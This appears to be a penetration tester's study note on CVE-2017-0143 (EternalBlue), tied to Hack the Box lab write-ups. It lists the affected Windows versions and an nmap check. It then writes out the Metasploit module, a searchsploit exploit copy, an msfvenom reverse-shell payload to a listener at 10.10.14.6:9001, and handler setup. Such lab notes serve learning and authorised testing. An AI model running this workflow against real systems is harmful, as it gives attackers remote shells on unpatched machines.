# CVE-2017-0143

CVE Details:
- [https://www.rapid7.com/db/vulnerabilities/msft-cve-2017-0143/](https://www.rapid7.com/db/vulnerabilities/msft-cve-2017-0143/)
- [https://www.cvedetails.com/cve/CVE-2017-0143/](https://www.cvedetails.com/cve/CVE-2017-0143/)

## Affected Technologies

SMBv1 Servers on several operating systems:
- Windows Vista SP2
- Windows Server 2008 SP2, R2 SP1
- Windows 7 SP1
- Windows 8.1
- Windows Server 2012 Gold, R2
- Windows RT 8.1
- Windows 10 Gold, 1511, 1607
- Windows Server 2016

## What Does it Do?

Allows remote code execution on a vulnerable server.

## Check if a System is Vulnerable

If port 445 is running:

```bash
$ nmap --script vuln [IP] -p 445
```

## Exploits

**Metasploit Module**

```
exploit/windows/smb/ms17_010_eternalblue
```

**Alternative Implementations**

Copy exploit code:

```bash
$ searchsploit -m windows/remote/42315.py
```

Configure options as per [this excellent tutorial](https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/). You may have to use `smb_send_file()` to deliver your payload rather than the `bitsadmin` method.

Generate a shell payload using `msfvenom`:

```bash
$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.6 lport=9001 -f exe -o sc.exe
```

Start a handler using `msfconsole`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ msfconsole -q
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 9001
lport => 9001
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.6:9001 
```

Run exploit:

```bash
$ python2 exploit.py [IP]
```

**Practical Examples**

- Windows 7: [[Writeups/Hack the Box/Boxes/Blue/10 - Eternal Blue#Working Exploit - 42315|Blue - Eternal Blue > Working Exploit - 42315]]
- Windows XP: [[Writeups/Hack the Box/Boxes/Legacy/10 - Eternal Blue|Legacy - Eternal Blue]]

## Mitigations

Patch!

## In the News

- [https://www.wired.co.uk/article/what-is-eternal-blue-exploit-vulnerability-patch](https://www.wired.co.uk/article/what-is-eternal-blue-exploit-vulnerability-patch)
- [https://www.computerweekly.com/news/252440964/WannaCrys-EternalBlue-exploit-still-a-threat](https://www.computerweekly.com/news/252440964/WannaCrys-EternalBlue-exploit-still-a-threat)

# Tags

#cve #windows #smb